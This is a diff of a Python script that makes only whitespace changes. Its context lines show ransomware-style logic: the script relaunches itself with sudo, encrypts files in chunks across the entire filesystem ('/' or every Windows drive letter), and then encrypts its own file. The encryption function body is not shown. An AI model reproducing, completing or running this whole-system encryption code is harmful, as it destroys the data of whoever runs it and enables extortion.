@@ -27,7 +27,6 @@ def check_and_relaunch():
         except Exception as e:
             logging.error(f"Failed to relaunch script with sudo: {e}")
             sys.exit(1)
-
     elif platform.system() == "Windows":
         logging.info("Script is not running with administrative privileges. Please run as an administrator.")
         sys.exit(1)
@@ -101,10 +100,10 @@ def encrypt_files_in_chunks(root_dir, exclude_paths, chunk_size=10):
 def main():
     root_dirs = ["/"] if platform.system() != "Windows" else [drive + ":\\" for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(drive + ":\\")]
     exclude_paths = EXCLUDE_DIRS
-    
+
     for root_dir in root_dirs:
         encrypt_files_in_chunks(root_dir, exclude_paths)
-    
+
     # Finally encrypt the current script
     for script in EXCLUDE_FILES:
         script_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), script)
@@ -113,6 +112,8 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
 
 
 
